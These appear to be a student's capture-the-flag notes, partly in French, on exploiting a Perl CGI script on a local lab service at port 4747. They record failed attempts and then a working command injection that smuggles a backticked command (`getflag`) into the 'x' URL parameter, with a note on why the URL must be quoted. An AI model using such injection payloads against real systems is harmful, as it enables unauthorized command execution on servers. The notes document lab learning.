# useful links
* http://files.avanquest.com/file-extension-pl/fr/
* https://www.codeconvert.ai/perl-to-c-converter
* https://www.botify.com/learn/basics/what-are-url-parameters

# cmd
* ``ls -la``
    * level04.pl -> file perl confirmed by cat cmd
* try 1 : modify .pl to exec getflag
    * ``cp level04.pl /tmp/.``
    * ``vim level04.pl``
    * change ``echo $y 2>&1`` for ``/bin/getflag``
    * ``perl level04.pl``
        * fail to get the flag
* try 2 : change echo like in level03
    * fail to get the flag
* try 3 : look at ``localhost:4747``
    * ``curl localhost:4747 > /tmp/response.txt``
    * cat -e ``/tmp/response.txt``
        * ``$``
    * ``curl localhost:4747/getflag``
        * 404 Not Found -> XD
    * ``curl localhost:4747/flag04``
        * 404 Not Found
* try 4 : analyse of .pl
    * l2 : ``localhost:4747`` -> something to do with curl localhost:4747
    * l9 : ``param("x")`` -> play with x ?
    * lets try ``curl localhost:4747?x=test``
        * ``test`` as response
    * ``curl localhost:4747?x=getflag``
        * ``getflag`` -> :sob:
    * ``curl localhost:4747?x=\`echo bouh\```
        * ``bouh`` -> :starry_eyes:
    * ``curl localhost:4747?x=`getflag` ``
        * pas la meme erreur, on avance
    * l6 : ``$y = $_[0]`` -> ``int y = argv[1];`` en C
    * ``curl 'localhost:4747?x=`getflag`' ``

# explications : Pourquoi ``curl 'localhost:4747?x=`getflag`' `` marche et pas ``curl localhost:4747?x=`getflag` `` ?
* pour que le ` soit compte (source : https://stackoverflow.com/questions/1547899/which-characters-make-a-url-invalid)